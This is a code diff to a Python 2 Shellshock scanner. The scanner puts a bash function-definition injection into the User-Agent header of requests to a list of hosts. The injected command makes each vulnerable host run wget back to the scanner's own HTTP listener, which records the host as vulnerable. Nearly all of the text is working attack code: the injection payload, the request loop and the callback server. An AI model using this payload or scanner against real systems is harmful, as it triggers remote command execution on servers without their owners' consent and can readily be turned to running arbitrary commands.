@@ -1,4 +1,4 @@
-
+import time
 import SocketServer
 import SimpleHTTPServer
 import threading
@@ -7,10 +7,11 @@ import sys
 import urllib2
 import hashlib
 import socket
+import pickle
 
 local_ip = socket.gethostbyname(socket.gethostname())
 
-local_port = 80
+local_port = 2805
 output_file = ""
 ids = {}
 
@@ -21,10 +22,13 @@ def record_scan_response():
 	
 class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 	def do_GET(self):
-
-		print self.path[1::]
-		print "%s Responded" % ids[self.path[1::]] 
-		output_file.write("%s: Responded\n" % ids[self.path[1::]])
+		with open('ids.pickle', 'r') as f:
+			ids = pickle.loads(f.read())
+		ident = self.path[1::]
+		host = ids[ident].strip()
+		print "%s Responded" % host
+		with open('output', 'a') as f:
+			f.write("%s is vulnerable\n" % host)
 		
 		self.send_response(200)
 		self.send_header('Content-type','text/html')
@@ -32,17 +36,14 @@ class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 		self.wfile.write(record_scan_response()) #call sample function here
 		return
 
-def test_ip(ip_address, target_port, identifier, ssl):
+def test_ip(host, ident):
 	#Send a Bash/CGI Injection with the unique identifier.
-	user_agent_str="() { ignored;};/bin/bash -c 'wget http://%s:%s/%s>>/dev/null'" %(local_ip,str(local_port),identifier)
+	user_agent_str="() { ignored;};/bin/bash -c 'wget http://%s:%s/%s>>/dev/null'" %(local_ip,str(local_port),ident)
 	print user_agent_str
 	opener = urllib2.build_opener()
 	opener.addheaders = [('User-agent', user_agent_str)]
 	try:
-		if not ssl:
-			response = opener.open("http://%s:%s/%s"%(ip_address,target_port,identifier))
-		else:
-			response = opener.open("https://%s:%s/%s"%(ip_address,target_port,identifier))
+		response = opener.open(host)
 	except:
 		print "Unable to connect, moving on"
 	return
@@ -96,8 +97,11 @@ def main():
 	ids = create_ip_scan_table(ips);
 	print ids
 	print ""
+	print "Dumping ids..."
+	with open('ids.pickle', 'w') as f:
+		f.write(pickle.dumps(ids))
 	t1_stop=threading.Event()
-	httpd = SocketServer.ThreadingTCPServer(('localhost', local_port),CustomHandler)
+	httpd = SocketServer.ThreadingTCPServer((local_ip, local_port),CustomHandler)
 	server = threading.Thread(target=httpd.serve_forever);
 	server.daemon=True
 	server.start();
@@ -105,7 +109,7 @@ def main():
 
 	
 	for id in ids.keys():
-		test_ip(ids[id],str(local_port),id,False)
+		test_ip(ids[id],id)
 	
 	print("Finished list, waiting 15 more seconds")
 	time.sleep(15);
